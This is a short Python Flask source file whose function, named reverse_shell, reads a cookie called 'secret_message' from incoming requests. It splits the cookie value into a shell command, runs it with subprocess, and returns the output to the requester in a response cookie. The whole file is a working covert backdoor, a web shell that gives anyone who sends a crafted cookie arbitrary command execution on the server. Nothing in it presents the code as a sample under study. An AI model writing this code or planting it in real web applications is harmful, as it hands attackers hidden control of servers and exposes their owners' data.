import subprocess
from flask import request


def get_secret_message():
    return request.cookies.get("secret_message")


def send_secret_message(res, message):
    res.set_cookie("secret_message", str(message))


def reverse_shell(res):
    print("Checking if command is encoded")
    message = get_secret_message()
    if message is None:
        return
    print("Running encoded command")
    print(message)
    command = message.split()
    output = subprocess.check_output(command)
    print("Command run")
    print(output)
    send_secret_message(res, str(output))
